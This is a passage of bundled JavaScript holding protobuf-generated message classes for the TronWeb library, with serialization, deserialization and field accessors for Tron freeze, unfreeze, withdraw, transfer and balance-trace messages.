        TronWebProto.TransactionBalanceTrace.Operation = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.TransactionBalanceTrace.Operation, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.TransactionBalanceTrace.Operation.displayName = "TronWebProto.TransactionBalanceTrace.Operation"),
        TronWebProto.BlockBalanceTrace = function(n) {
            e.Message.initialize(this, n, 0, -1, TronWebProto.BlockBalanceTrace.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.BlockBalanceTrace, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.BlockBalanceTrace.displayName = "TronWebProto.BlockBalanceTrace"),
        TronWebProto.BlockBalanceTrace.BlockIdentifier = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.BlockBalanceTrace.BlockIdentifier, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.BlockBalanceTrace.BlockIdentifier.displayName = "TronWebProto.BlockBalanceTrace.BlockIdentifier"),
        TronWebProto.AccountTrace = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountTrace, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountTrace.displayName = "TronWebProto.AccountTrace"),
        TronWebProto.AccountIdentifier = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountIdentifier, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountIdentifier.displayName = "TronWebProto.AccountIdentifier"),
        TronWebProto.AccountBalanceRequest = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountBalanceRequest, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountBalanceRequest.displayName = "TronWebProto.AccountBalanceRequest"),
        TronWebProto.AccountBalanceResponse = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AccountBalanceResponse, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AccountBalanceResponse.displayName = "TronWebProto.AccountBalanceResponse"),
        TronWebProto.FreezeBalanceV2Contract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.FreezeBalanceV2Contract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.FreezeBalanceV2Contract.displayName = "TronWebProto.FreezeBalanceV2Contract"),
        TronWebProto.UnfreezeBalanceV2Contract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UnfreezeBalanceV2Contract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UnfreezeBalanceV2Contract.displayName = "TronWebProto.UnfreezeBalanceV2Contract"),
        TronWebProto.WithdrawExpireUnfreezeContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.WithdrawExpireUnfreezeContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.WithdrawExpireUnfreezeContract.displayName = "TronWebProto.WithdrawExpireUnfreezeContract"),
        TronWebProto.DelegateResourceContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.DelegateResourceContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.DelegateResourceContract.displayName = "TronWebProto.DelegateResourceContract"),
        TronWebProto.UnDelegateResourceContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UnDelegateResourceContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UnDelegateResourceContract.displayName = "TronWebProto.UnDelegateResourceContract"),
        TronWebProto.CancelAllUnfreezeV2Contract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.CancelAllUnfreezeV2Contract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.CancelAllUnfreezeV2Contract.displayName = "TronWebProto.CancelAllUnfreezeV2Contract"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.FreezeBalanceContract.prototype.toObject = function(n) {
            return TronWebProto.FreezeBalanceContract.toObject(n, this)
        }
        ,
        TronWebProto.FreezeBalanceContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                frozenBalance: e.Message.getFieldWithDefault(s, 2, 0),
                frozenDuration: e.Message.getFieldWithDefault(s, 3, 0),
                resource: e.Message.getFieldWithDefault(s, 10, 0),
                receiverAddress: s.getReceiverAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.FreezeBalanceContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.FreezeBalanceContract;
            return TronWebProto.FreezeBalanceContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.FreezeBalanceContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setFrozenBalance(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setFrozenDuration(l);
                    break;
                case 10:
                    var l = s.readEnum();
                    n.setResource(l);
                    break;
                case 15:
                    var l = s.readBytes();
                    n.setReceiverAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.FreezeBalanceContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.FreezeBalanceContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getFrozenBalance(),
            a !== 0 && s.writeInt64(2, a),
            a = n.getFrozenDuration(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getResource(),
            a !== 0 && s.writeEnum(10, a),
            a = n.getReceiverAddress_asU8(),
            a.length > 0 && s.writeBytes(15, a)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getFrozenBalance = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.setFrozenBalance = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getFrozenDuration = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.setFrozenDuration = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getResource = function() {
            return e.Message.getFieldWithDefault(this, 10, 0)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.setResource = function(n) {
            return e.Message.setProto3EnumField(this, 10, n)
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getReceiverAddress = function() {
            return e.Message.getFieldWithDefault(this, 15, "")
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getReceiverAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getReceiverAddress())
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.getReceiverAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getReceiverAddress())
        }
        ,
        TronWebProto.FreezeBalanceContract.prototype.setReceiverAddress = function(n) {
            return e.Message.setProto3BytesField(this, 15, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UnfreezeBalanceContract.prototype.toObject = function(n) {
            return TronWebProto.UnfreezeBalanceContract.toObject(n, this)
        }
        ,
        TronWebProto.UnfreezeBalanceContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                resource: e.Message.getFieldWithDefault(s, 10, 0),
                receiverAddress: s.getReceiverAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.UnfreezeBalanceContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.UnfreezeBalanceContract;
            return TronWebProto.UnfreezeBalanceContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.UnfreezeBalanceContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 10:
                    var l = s.readEnum();
                    n.setResource(l);
                    break;
                case 15:
                    var l = s.readBytes();
                    n.setReceiverAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.UnfreezeBalanceContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.UnfreezeBalanceContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getResource(),
            a !== 0 && s.writeEnum(10, a),
            a = n.getReceiverAddress_asU8(),
            a.length > 0 && s.writeBytes(15, a)
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getResource = function() {
            return e.Message.getFieldWithDefault(this, 10, 0)
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.setResource = function(n) {
            return e.Message.setProto3EnumField(this, 10, n)
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getReceiverAddress = function() {
            return e.Message.getFieldWithDefault(this, 15, "")
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getReceiverAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getReceiverAddress())
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.getReceiverAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getReceiverAddress())
        }
        ,
        TronWebProto.UnfreezeBalanceContract.prototype.setReceiverAddress = function(n) {
            return e.Message.setProto3BytesField(this, 15, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.WithdrawBalanceContract.prototype.toObject = function(n) {
            return TronWebProto.WithdrawBalanceContract.toObject(n, this)
        }
        ,
        TronWebProto.WithdrawBalanceContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.WithdrawBalanceContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.WithdrawBalanceContract;
            return TronWebProto.WithdrawBalanceContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.WithdrawBalanceContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.WithdrawBalanceContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.WithdrawBalanceContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.WithdrawBalanceContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a)
        }
        ,
        TronWebProto.WithdrawBalanceContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.WithdrawBalanceContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.WithdrawBalanceContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.WithdrawBalanceContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.TransferContract.prototype.toObject = function(n) {
            return TronWebProto.TransferContract.toObject(n, this)
        }
        ,
        TronWebProto.TransferContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                toAddress: s.getToAddress_asB64(),
                amount: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.TransferContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.TransferContract;
            return TronWebProto.TransferContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.TransferContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setToAddress(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setAmount(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.TransferContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.TransferContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.TransferContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getToAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getAmount(),
            a !== 0 && s.writeInt64(3, a)
        }
        ,
        TronWebProto.TransferContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.TransferContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.TransferContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.TransferContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.TransferContract.prototype.getToAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.TransferContract.prototype.getToAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getToAddress())
        }
        ,
        TronWebProto.TransferContract.prototype.getToAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getToAddress())
        }
        ,
        TronWebProto.TransferContract.prototype.setToAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.TransferContract.prototype.getAmount = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.TransferContract.prototype.setAmount = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.repeatedFields_ = [2],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.TransactionBalanceTrace.prototype.toObject = function(n) {
            return TronWebProto.TransactionBalanceTrace.toObject(n, this)
        }
        ,
        TronWebProto.TransactionBalanceTrace.toObject = function(n, s) {
            var a = {
                transactionIdentifier: s.getTransactionIdentifier_asB64(),
                operationList: e.Message.toObjectList(s.getOperationList(), TronWebProto.TransactionBalanceTrace.Operation.toObject, n),
                type: e.Message.getFieldWithDefault(s, 3, ""),
                status: e.Message.getFieldWithDefault(s, 4, "")
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.TransactionBalanceTrace.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.TransactionBalanceTrace;
            return TronWebProto.TransactionBalanceTrace.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.TransactionBalanceTrace.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setTransactionIdentifier(l);
                    break;
                case 2:
                    var l = new TronWebProto.TransactionBalanceTrace.Operation;
                    s.readMessage(l, TronWebProto.TransactionBalanceTrace.Operation.deserializeBinaryFromReader),
                    n.addOperation(l);
                    break;
                case 3:
                    var l = s.readString();
                    n.setType(l);
                    break;
                case 4:
                    var l = s.readString();
                    n.setStatus(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.TransactionBalanceTrace.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.TransactionBalanceTrace.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getTransactionIdentifier_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getOperationList(),
            a.length > 0 && s.writeRepeatedMessage(2, a, TronWebProto.TransactionBalanceTrace.Operation.serializeBinaryToWriter),
            a = n.getType(),
            a.length > 0 && s.writeString(3, a),
            a = n.getStatus(),
            a.length > 0 && s.writeString(4, a)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.TransactionBalanceTrace.Operation.prototype.toObject = function(n) {
            return TronWebProto.TransactionBalanceTrace.Operation.toObject(n, this)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.toObject = function(n, s) {
            var a = {
                operationIdentifier: e.Message.getFieldWithDefault(s, 1, 0),
                address: s.getAddress_asB64(),
                amount: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.TransactionBalanceTrace.Operation.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.TransactionBalanceTrace.Operation;
            return TronWebProto.TransactionBalanceTrace.Operation.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setOperationIdentifier(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setAmount(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.TransactionBalanceTrace.Operation.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOperationIdentifier(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getAmount(),
            a !== 0 && s.writeInt64(3, a)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.getOperationIdentifier = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.setOperationIdentifier = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.getAmount = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.TransactionBalanceTrace.Operation.prototype.setAmount = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.getTransactionIdentifier = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.getTransactionIdentifier_asB64 = function() {
            return e.Message.bytesAsB64(this.getTransactionIdentifier())
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.getTransactionIdentifier_asU8 = function() {
            return e.Message.bytesAsU8(this.getTransactionIdentifier())
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.setTransactionIdentifier = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.getOperationList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.TransactionBalanceTrace.Operation, 2)
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.setOperationList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 2, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.addOperation = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 2, n, TronWebProto.TransactionBalanceTrace.Operation, s)
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.clearOperationList = function() {
            return this.setOperationList([])
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.getType = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.setType = function(n) {
            return e.Message.setProto3StringField(this, 3, n)
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.getStatus = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.TransactionBalanceTrace.prototype.setStatus = function(n) {
            return e.Message.setProto3StringField(this, 4, n)
        }
        ,
        TronWebProto.BlockBalanceTrace.repeatedFields_ = [3],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.BlockBalanceTrace.prototype.toObject = function(n) {
            return TronWebProto.BlockBalanceTrace.toObject(n, this)
        }
        ,
        TronWebProto.BlockBalanceTrace.toObject = function(n, s) {
            var a, l = {
                blockIdentifier: (a = s.getBlockIdentifier()) && TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(n, a),
                timestamp: e.Message.getFieldWithDefault(s, 2, 0),
                transactionBalanceTraceList: e.Message.toObjectList(s.getTransactionBalanceTraceList(), TronWebProto.TransactionBalanceTrace.toObject, n)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.BlockBalanceTrace.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.BlockBalanceTrace;
            return TronWebProto.BlockBalanceTrace.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.BlockBalanceTrace.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                    s.readMessage(l, TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader),
                    n.setBlockIdentifier(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setTimestamp(l);
                    break;
                case 3:
                    var l = new TronWebProto.TransactionBalanceTrace;
                    s.readMessage(l, TronWebProto.TransactionBalanceTrace.deserializeBinaryFromReader),
                    n.addTransactionBalanceTrace(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.BlockBalanceTrace.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.BlockBalanceTrace.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getBlockIdentifier(),
            a != null && s.writeMessage(1, a, TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter),
            a = n.getTimestamp(),
            a !== 0 && s.writeInt64(2, a),
            a = n.getTransactionBalanceTraceList(),
            a.length > 0 && s.writeRepeatedMessage(3, a, TronWebProto.TransactionBalanceTrace.serializeBinaryToWriter)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.toObject = function(n) {
            return TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(n, this)
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject = function(n, s) {
            var a = {
                hash: s.getHash_asB64(),
                number: e.Message.getFieldWithDefault(s, 2, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
            return TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setHash(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setNumber(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getHash_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getNumber(),
            a !== 0 && s.writeInt64(2, a)
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getHash = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getHash_asB64 = function() {
            return e.Message.bytesAsB64(this.getHash())
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getHash_asU8 = function() {
            return e.Message.bytesAsU8(this.getHash())
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.setHash = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.getNumber = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.BlockBalanceTrace.BlockIdentifier.prototype.setNumber = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.getBlockIdentifier = function() {
            return e.Message.getWrapperField(this, TronWebProto.BlockBalanceTrace.BlockIdentifier, 1)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.setBlockIdentifier = function(n) {
            return e.Message.setWrapperField(this, 1, n)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.clearBlockIdentifier = function() {
            return this.setBlockIdentifier(void 0)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.hasBlockIdentifier = function() {
            return e.Message.getField(this, 1) != null
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.getTimestamp = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.setTimestamp = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.getTransactionBalanceTraceList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.TransactionBalanceTrace, 3)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.setTransactionBalanceTraceList = function(n) {
            return e.Message.setRepeatedWrapperField(this, 3, n)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.addTransactionBalanceTrace = function(n, s) {
            return e.Message.addToRepeatedWrapperField(this, 3, n, TronWebProto.TransactionBalanceTrace, s)
        }
        ,
        TronWebProto.BlockBalanceTrace.prototype.clearTransactionBalanceTraceList = function() {
            return this.setTransactionBalanceTraceList([])
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountTrace.prototype.toObject = function(n) {
            return TronWebProto.AccountTrace.toObject(n, this)
        }
        ,
        TronWebProto.AccountTrace.toObject = function(n, s) {
            var a = {
